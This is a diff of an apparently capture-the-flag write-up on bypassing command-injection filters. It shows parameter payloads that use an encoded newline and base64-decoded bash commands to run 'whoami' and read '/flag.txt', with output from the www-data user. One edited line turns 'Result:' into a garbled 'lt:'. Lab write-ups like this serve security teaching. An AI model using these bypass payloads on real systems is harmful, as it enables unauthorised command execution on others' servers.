@@ -66,7 +66,7 @@ echo -n 'whoami' | base64
 Parameter: to
 Original: to=test
 Bypass:   to=%0abash<<<$(base64%09-d<<<d2hvYW1p)
-Result:   uid=33(www-data) gid=33(www-data) groups=33(www-data)
+lt:   uid=33(www-data) gid=33(www-data) groups=33(www-data)
 Status:   ✅ SUCCESS
 ```
 
@@ -343,11 +343,6 @@ echo -n 'cat /flag.txt' | base64
 **Payload:**
 ```
 ?param=%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
-```
-
-**Result:**
-```
-HTB{f1l3_m4n4g3r_1nj3ct10n_byp4ss}
 ```
 
 ### Example 3: Directory Listing
